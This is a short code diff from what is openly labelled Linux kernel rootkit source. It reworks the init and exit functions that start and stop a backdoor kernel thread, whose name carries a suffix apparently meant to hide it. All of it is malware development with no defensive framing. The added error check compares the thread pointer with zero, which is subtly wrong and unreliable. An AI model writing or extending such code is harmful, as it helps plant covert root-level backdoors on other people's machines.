@@ -21,12 +21,15 @@ static int backdoor_thread_fn(void* data){
 	return 0;
 }
 
-void __init start_backdoor(void){
+int __init backdoor_init(void){
 	printk(KERN_INFO "ROOTKIT: Starting backdoor thread\n");
 	backdoor_thread = kthread_create(backdoor_thread_fn, NULL, "bkd" HIDE_STR); //max name length seems to be 15
+	if (backdoor_thread < 0)
+		return -1;
 	wake_up_process(backdoor_thread);
+	return 0;
 }
 
-void __exit stop_backdoor(void){
+void __exit backdoor_exit(void){
 	kthread_stop(backdoor_thread);
 }
